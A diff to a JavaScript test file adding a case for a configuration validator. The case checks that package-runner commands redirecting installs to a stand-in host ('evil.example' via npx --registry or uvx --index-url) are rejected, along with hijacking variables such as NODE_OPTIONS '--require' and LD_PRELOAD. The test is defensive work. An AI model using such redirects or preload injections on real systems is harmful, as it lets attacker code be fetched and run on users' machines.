@@ -106,3 +106,17 @@ test('diff-scope: manual entries cannot be edited by sync', () => {
   const b = entry();
   assert.equal(diffScope({ baseMcps: [b], headMcps: [{ ...b, description: 'x' }], changedFiles: R }).length, 1);
 });
+
+test('runner guard (TD-043): runner-changing flags and reserved env names are rejected', () => {
+  const run = over => universalChecks({ baseMcps: [], headMcps: [entry(over)] });
+  const cmd = (...c) => ({ config: { command: c } });
+  assert.deepEqual(run({}), []);
+  assert.deepEqual(run(cmd('npx', '-y', 'a-thing@1.2.3', '-p', '8080')), []);
+  assert.notEqual(run(cmd('npx', '-y', '--registry=https://evil.example', 'a-thing@1.2.3')).length, 0);
+  assert.notEqual(run(cmd('uvx', '--index-url', 'https://evil.example', 'a-thing==1.2.3')).length, 0);
+  const withEnv = env => ({ config: { command: ['npx', '-y', 'a-thing@1.2.3'], env } });
+  assert.equal(run(withEnv({ NPM_CONFIG_REGISTRY: 'x' })).length, 1);
+  assert.equal(run(withEnv({ NODE_OPTIONS: '--require x' })).length, 1);
+  assert.equal(run({ credential_schema: { properties: { LD_PRELOAD: { type: 'string' } } } }).length, 1);
+  assert.deepEqual(run(withEnv({ NODE_ENV: 'production' })), []);
+});
